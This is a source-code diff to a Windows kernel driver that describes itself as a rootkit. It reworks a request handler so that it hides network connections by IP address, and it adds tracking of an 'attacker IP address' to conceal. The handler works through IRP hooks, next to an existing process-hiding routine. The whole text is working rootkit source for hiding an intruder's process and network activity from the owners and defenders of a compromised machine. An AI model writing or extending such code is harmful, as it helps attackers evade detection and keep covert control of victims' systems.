@@ -1,8 +1,16 @@
 #include "requests.h"
 #pragma warning(disable:4996)
 #pragma warning(disable:4302)
+#pragma warning(disable:4311)
 
 
+// Global variables:
+ULONG AttackerAddressValue = 0;
+
+
+ULONG ReturnAttackerIPAddress() {
+	return AttackerAddressValue;
+}
 
 
 NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
@@ -811,8 +819,8 @@ NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst) {
 }
 
 
-NTSTATUS HidePortConnectionRK(ROOTKIT_MEMORY* RootkInst) {
-	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook (port number = %hu, index = %hu)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
+NTSTATUS HideNetworkConnectionRK(ROOTKIT_MEMORY* RootkInst) {
+	DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook (IP address number = %lu, index = %hu)\n", (ULONG)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 	PEPROCESS MediumProcess = { 0 };
 	KAPC_STATE MediumState = { 0 };
@@ -820,70 +828,114 @@ NTSTATUS HidePortConnectionRK(ROOTKIT_MEMORY* RootkInst) {
 	PVOID HiddenInput = NULL;
 	ULONG64 TempSize = 0;
 	ULONG64 PortManType = RootkInst->Size;
+	WCHAR AttackerAddress[MAX_PATH] = { 0 };
+	WCHAR CurrentAddress[MAX_PATH] = { 0 };
+	UNICODE_STRING AttackerAddressUnicode = { 0 };
+	UNICODE_STRING CurrentAddressUnicode = { 0 };
+	ULONG CurrentAddressValue = 0;
+
+
+	// If attacker IP address is not the same as currrent update it:
+	if ((ULONG)RootkInst->SemiPID != AttackerAddressValue && (ULONG)RootkInst->SemiPID != 0) {
+		AttackerAddressValue = (ULONG)RootkInst->SemiPID;
+		if (general_helpers::CalculateAddressString(AttackerAddress, AttackerAddressValue)) {
+			AttackerAddressUnicode.Buffer = AttackerAddress;
+			AttackerAddressUnicode.Length = (USHORT)wcslen(AttackerAddress) * sizeof(WCHAR);
+			AttackerAddressUnicode.MaximumLength = (USHORT)(wcslen(AttackerAddress) + 1) * sizeof(WCHAR);
+			DbgPrintEx(0, 0,
+				"KMDFdriver Requests - Received new attacker IP address to hide: %lu, %wZ\n",
+				(ULONG)RootkInst->SemiPID, &AttackerAddressUnicode);
+		}
+		else {
+			DbgPrintEx(0, 0,
+				"KMDFdriver Requests - Received new attacker IP address to hide: %lu, unresolved\n",
+				(ULONG)RootkInst->SemiPID);
+		}
+	}
 
 
 	// Check for invalid arguments:
-	if (((USHORT)RootkInst->Buffer == 0 && (USHORT)RootkInst->Reserved == 0 && PortManType != ListHiddenPorts) ||
-		!(PortManType == HidePort || PortManType == UnhidePort || PortManType == ListHiddenPorts) ||
-		(PortManType == HidePort && (USHORT)RootkInst->Buffer == 0) || 
-		(PortManType == ListHiddenPorts && RootkInst->MedPID == 0) ||
-		(PortManType == ListHiddenPorts && RootkInst->Out == NULL)) {
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook failed (invalid port: %hu / invalid index %hu / invalid medium PID %hu / invalid request number: %llu / invalid output buffer: %p)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, (USHORT)RootkInst->MedPID, PortManType, RootkInst->Out);
+	if (((ULONG)RootkInst->Buffer == REMOVE_BY_INDEX_ADDR && (USHORT)RootkInst->Reserved == 0 && PortManType != ListHiddenAddresses) ||
+		!(PortManType == HideAddress || PortManType == UnhideAddress || PortManType == ListHiddenAddresses) ||
+		(PortManType == HideAddress && (ULONG)RootkInst->Buffer == REMOVE_BY_INDEX_ADDR) ||
+		(PortManType == ListHiddenAddresses && RootkInst->MedPID == 0) ||
+		(PortManType == ListHiddenAddresses && RootkInst->Out == NULL)) {
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook failed (invalid port: %hu / invalid index %hu / invalid medium PID %hu / invalid request number: %llu / invalid output buffer: %p)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, (USHORT)RootkInst->MedPID, PortManType, RootkInst->Out);
 		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
 	}
 
 
 	// Handle the different requests:
-	if (PortManType == HidePort) {
+	if (PortManType != ListHiddenAddresses) {
+		CurrentAddressValue = (ULONG)RootkInst->Buffer;
+		if (CurrentAddressValue != 0 && 
+			general_helpers::CalculateAddressString(CurrentAddress, CurrentAddressValue)) {
+			CurrentAddressUnicode.Buffer = CurrentAddress;
+			CurrentAddressUnicode.Length = (USHORT)wcslen(CurrentAddress) * sizeof(WCHAR);
+			CurrentAddressUnicode.MaximumLength = (USHORT)(wcslen(CurrentAddress) + 1) * sizeof(WCHAR);
+			DbgPrintEx(0, 0,
+				"KMDFdriver Requests - Received new IP address to hide: %lu, %wZ\n",
+				CurrentAddressValue, &CurrentAddressUnicode);
+		}
+		else {
+			DbgPrintEx(0, 0,
+				"KMDFdriver Requests - Received new IP address to hide: %lu, unresolved\n",
+				CurrentAddressValue);
+		}
+	}
+	if (PortManType == HideAddress) {
 
-		// Pass port to hide in case its not already in the list:
-		if (irphooking::port_list::CheckIfInPortList((USHORT)RootkInst->Buffer, NULL)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook, port %hu is already hidden\n", (USHORT)RootkInst->Buffer);
+		// Pass IP address value to hide in case its not already in the list:
+		if (irphooking::address_list::CheckIfInAddressList(CurrentAddressValue, NULL)) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook, IP address %lu is already hidden\n",
+				CurrentAddressValue);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 		}
-		Status = irphooking::port_list::AddToPortList((USHORT)RootkInst->Buffer);
+		Status = irphooking::address_list::AddToAddressList(CurrentAddressValue);
 		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook failed (hiding function with port of %hu failed with status 0x%x)\n", (USHORT)RootkInst->Buffer, Status);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook failed (hiding function with address of %lu failed with status 0x%x)\n",
+				CurrentAddressValue, Status);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide port connection via IRP hook succeeded, hidden process with port of %hu\n", (USHORT)RootkInst->Buffer);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Hide networking connections via IRP hook succeeded, hidden process with address of %lu\n",
+			CurrentAddressValue);
 	}
-	else if (PortManType == UnhidePort) {
+	else if (PortManType == UnhideAddress) {
 
-		// Pass the index and port number arguments and return the result:
-		Status = irphooking::port_list::RemoveFromPortList((USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);  // Remove via index/port number
+		// Pass the index and IP address value arguments and return the result:
+		Status = irphooking::address_list::RemoveFromAddressList(CurrentAddressValue, (USHORT)RootkInst->Reserved);  // Remove via index/IP address value
 		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden port connection via IRP hook failed (unhiding function with port of %hu / index of %hu failed with status 0x%x)\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved, Status);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden networking connections via IRP hook failed (unhiding function with IP address value of %lu / index of %hu failed with status 0x%x)\n", CurrentAddressValue, (USHORT)RootkInst->Reserved, Status);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, Status, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden port connection via IRP hook succeeded, unhidden port %hu, index %hu\n", (USHORT)RootkInst->Buffer, (USHORT)RootkInst->Reserved);
+		DbgPrintEx(0, 0, "KMDFdriver Requests - Unhide hidden networking connections via IRP hook succeeded, unhidden port %hu, index %hu\n", CurrentAddressValue, (USHORT)RootkInst->Reserved);
 	}
 	else {
 
 		// List hidden ports - attach to medium, allocate memory for list and return list:
 		if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MedPID, &MediumProcess))) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (cannot get EPROCESS of medium process with PID of %llu)\n", RootkInst->MedPID);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		if (!NT_SUCCESS(irphooking::port_list::ReturnPortList(&HiddenInput, &TempSize))) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections, hidden port list is empty!\n");
+		if (!NT_SUCCESS(irphooking::address_list::ReturnAddressList(&HiddenInput, &TempSize))) {
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections, hidden port list is empty!\n");
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 		}
 		TempOutput = RootkInst->Out;
 		KeStackAttachProcess(MediumProcess, &MediumState);
 		TempOutput = memory_helpers::AllocateMemoryADD(TempOutput, TempSize, &MediumState, 0);
 		if (TempOutput == NULL) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (Allocation of memory for list in medium failed: %p, %llu)\n", TempOutput, TempSize);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (Allocation of memory for list in medium failed: %p, %llu)\n", TempOutput, TempSize);
 			return requests_helpers::ExitRootkitRequestADD(NULL, MediumProcess, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
 		}
 		RootkInst->Out = TempOutput;
 		RootkInst->Size = TempSize;
 		Status = KernelToUserMEM(MediumProcess, HiddenInput, RootkInst->Out, RootkInst->Size, FALSE);
 		if (!NT_SUCCESS(Status)) {
-			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
+			DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections failed (KernelToUserMEM() of list failed: %p, %p, %zu)\n", RootkInst->Out, RootkInst->Buffer, RootkInst->Size);
 			return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
 		}
-		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden ports connections succeeded\n");
+		DbgPrintEx(0, 0, "KMDFdriver Requests - List hidden networking connections succeeded\n");
 	}
 	return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
 }
